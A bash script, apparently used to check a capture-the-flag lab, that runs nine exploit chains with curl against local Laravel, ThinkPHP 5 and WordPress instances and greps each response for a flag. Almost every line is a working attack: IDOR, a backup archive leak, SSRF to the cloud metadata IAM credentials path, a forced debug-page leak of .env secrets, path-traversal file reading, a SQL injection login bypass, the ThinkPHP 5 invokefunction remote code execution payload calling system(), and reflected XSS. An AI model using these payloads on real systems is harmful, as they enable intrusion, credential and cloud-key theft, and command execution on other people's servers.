#!/bin/bash
# 验证 9 条利用链（单实例部署）
B=http://127.0.0.1:8101
A=http://127.0.0.1:8201
N=http://127.0.0.1:8301
J=/tmp/cj.txt; rm -f $J

echo "== 1 portal home =="
code=$(curl -s -o /tmp/h.html -w '%{http_code}' $B/home)
echo "status=$code  title=$(grep -o '<title>[^<]*' /tmp/h.html | head -1)"

echo "== 2 login (test@starlan.club) =="
curl -s -c $J $B/login -o /tmp/lg.html
TOKEN=$(grep -o 'name="_token" value="[^"]*' /tmp/lg.html | head -1 | sed 's/.*value="//')
echo "token=${TOKEN:0:12}..."
curl -s -b $J -c $J -o /dev/null -w 'status=%{http_code} redirect=%{redirect_url}\n' \
  -d "_token=$TOKEN&email=test@starlan.club&password=123456" $B/login

echo "== 3 IDOR /registration/3 (admin 的报名，flag 在 remark) =="
curl -s -b $J -o /tmp/r.html -w 'status=%{http_code}\n' $B/registration/3
grep -o 'flag{[^}]*}' /tmp/r.html | head -1

echo "== 4 backup.zip 下载 =="
curl -s -b $J -o /tmp/b.zip -w 'status=%{http_code} size=%{size_download}\n' $B/backup.zip
rm -rf /tmp/bk && mkdir /tmp/bk && (cd /tmp/bk && unzip -o -q /tmp/b.zip 2>/dev/null; grep -o 'flag{[^}]*}' .env 2>/dev/null)

echo "== 5 SSRF preview -> metadata IAM =="
curl -s -b $J -c $J $B/preview -o /tmp/pg.html
TOKEN=$(grep -o 'name="_token" value="[^"]*' /tmp/pg.html | head -1 | sed 's/.*value="//')
curl -s -b $J -o /tmp/p.html -w 'status=%{http_code}\n' \
  --data-urlencode "_token=$TOKEN" \
  --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/club-platform' $B/preview
grep -o 'flag{[^}]*}' /tmp/p.html | head -1

echo "== 6 Laravel debug 页泄露 .env (非法 URL 触发 500) =="
curl -s -b $J -o /tmp/d.html -w 'status=%{http_code}\n' \
  --data-urlencode "_token=$TOKEN" \
  --data-urlencode 'url=::::not-a-url' $B/preview
grep -o 'SMS_API_SECRET[^,}"]*' /tmp/d.html | head -2
grep -o 'flag{[^}]*}' /tmp/d.html | head -1

echo "== 7 LFI /files/download 穿越读 legacy_config.txt =="
curl -s -b $J "$B/files/download?name=../../../../../var/www/legacy_config.txt" | grep -o 'flag{[^}]*}'

echo "== 8 TP5 后台登录页 =="
curl -s -o /tmp/a.html -w 'status=%{http_code}\n' "$A/index.php/index/login/index"
grep -o '<title>[^<]*' /tmp/a.html | head -1

echo "== 8b TP5 SQLi 拼接注入绕过登录 =="
rm -f /tmp/aj.txt
curl -s -c /tmp/aj.txt -o /tmp/ab.html -w 'status=%{http_code} redirect=%{redirect_url}\n' \
  --data-urlencode "username=admin' or '1'='1' or '1'='1" \
  --data-urlencode 'password=whatever' \
  "$A/index.php/index/login/doLogin"
curl -s -b /tmp/aj.txt -o /tmp/ai.html "$A/index.php/index/index/index"
grep -o 'flag{[^}]*}' /tmp/ai.html | head -1

echo "== 9 TP5 invokefunction RCE 读 FLAG_TP =="
curl -s "$A/index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=printenv+FLAG_TP"

echo
echo "== 10 WP 资讯站首页 =="
curl -s -o /tmp/n.html -w 'status=%{http_code}\n' $N/
grep -o '<title>[^<]*' /tmp/n.html | head -1

echo "== 11 WP 插件反射 XSS (sm_card) =="
curl -s "$N/?sm_card=%3Cscript%3Ealert(1)%3C/script%3E" | grep -o 'flag{[^}]*}'
